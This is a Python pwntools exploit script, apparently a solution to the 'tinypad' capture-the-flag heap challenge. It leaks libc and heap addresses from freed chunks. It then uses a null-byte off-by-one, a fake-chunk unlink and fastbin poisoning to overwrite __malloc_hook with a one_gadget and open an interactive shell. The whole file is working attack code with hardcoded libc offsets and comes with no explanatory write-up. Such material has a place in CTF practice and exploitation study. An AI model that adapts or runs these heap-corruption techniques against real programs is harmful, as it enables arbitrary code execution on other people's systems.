from pwn import *

#context.log_level = 'debug'

r = process('./tinypad')
elf = ELF('./tinypad')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

#system_plt = elf.plt['system']
#print 'system_plt= ' + hex(system_plt)
#free_got = elf.got['free']
#print 'free_got= ' + hex(free_got)
#puts_plt = elf.plt['puts']
#print 'puts_plt= ' + hex(puts_plt)
#puts_got = elf.got['puts']
#print 'puts_got= ' + hex(puts_got)
#got0= elf.get_section_by_name('.got.plt').header.sh_addr
#print 'got0= ' + hex(got0)
#fake_chunk = got0 + 2 - 8
#print 'fake_chunk= ' + hex(fake_chunk)
#chunklist=0x602140

def add(size, content, is_over=False):
  r.recvuntil('(CMD)>>> ')
  r.sendline('A')
  r.recvuntil('(SIZE)>>> ')
  r.sendline(str(size))
  if is_over:
    return
  r.recvuntil('(CONTENT)>>> ')
#  if size > len(content):
  r.sendline(content)
#  else:
#    r.send(content)

def free(index):
  r.recvuntil('(CMD)>>> ')
  r.sendline('D')
  r.recvuntil('(INDEX)>>> ')
  r.sendline(str(index))

def edit(index, content):
  r.recvuntil('(CMD)>>> ')
  r.sendline('E')
  r.recvuntil('(INDEX)>>> ')
  r.sendline(str(index))
  r.recvuntil('(CONTENT)>>> ')
  r.sendline(content)
  r.recvuntil('(Y/n)>>> ')
  r.sendline('Y')

def exp():
  add(0x98, '') #1
  add(0x68, '') #2
  add(0x68, '') #3
  free(1)
  free(3)
  free(2) #fastbin: 2 -> 3
  
  #leak main_area by unsorted bin
  r.recvuntil(' #   INDEX: 1\n # CONTENT: ')
  data = r.recvuntil('\n', drop=True)
  main_area = u64(data + '\0' * 2)
  print 'main_area= ' + hex(main_area)

  #v23 = (volatile signed __int32 *)&dword_3C4B20;
  libc_base = main_area - 88 - 0x3C4B20;
  print 'libc_base= ' + hex(libc_base)
  
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  malloc_hook = libc_base + libc.symbols['__malloc_hook']
  print 'malloc_hook= ' + hex(malloc_hook)
  free_hook = libc_base + libc.symbols['__free_hook']
  print 'free_hook= ' + hex(free_hook)
  one_gadget = libc_base + 0xf1147 #0xf02a4 also works
  print 'one_gadget= ' + hex(one_gadget)
  global_max_fast = libc_base + libc.symbols['global_max_fast']
  print 'global_max_fast= ' + hex(global_max_fast)
  
  # leak heap addr by fastbin
  r.recvuntil(' #   INDEX: 2\n # CONTENT: ')
  data = r.recvuntil('\n', drop=True)
  chunk3 = u64(data.ljust(8, '\0'))
  print 'chunk3= ' + hex(chunk3)
  
  payload = 'a' * 0x48 + p64(0x91) + p64(chunk3 - 0x20) + p64(chunk3 - 0x20)
  add(0x68, payload) #1
  add(0xf8, '') #2
  payload = 'a' * 0x60 + p64(0x90)
  add(0x68, payload) #3 null of_by_one fake next chunk

  # NEED to unlink then free fast bin, otherwise, fast bin would be reset to NULL!!!
  free(2) # would unlink fake 0x90
  free(1)
  free(3)  # fastbin: 3 -> 1

  # OVERLAP 1(small chunk) and 3(fast chunk)
  payload = 'a' * 0x18 + p64(0x7f) + p64(malloc_hook - 0x23)
  gdb.attach(r)
  add(0xf8, payload) #1
  add(0x68, '') #2

  payload = '\0' * 0x13 + p64(one_gadget)
  add(0x68, payload) # 3

  add(0x10, '', is_over=True) #4
  r.interactive()

if __name__ == '__main__':
  exp()
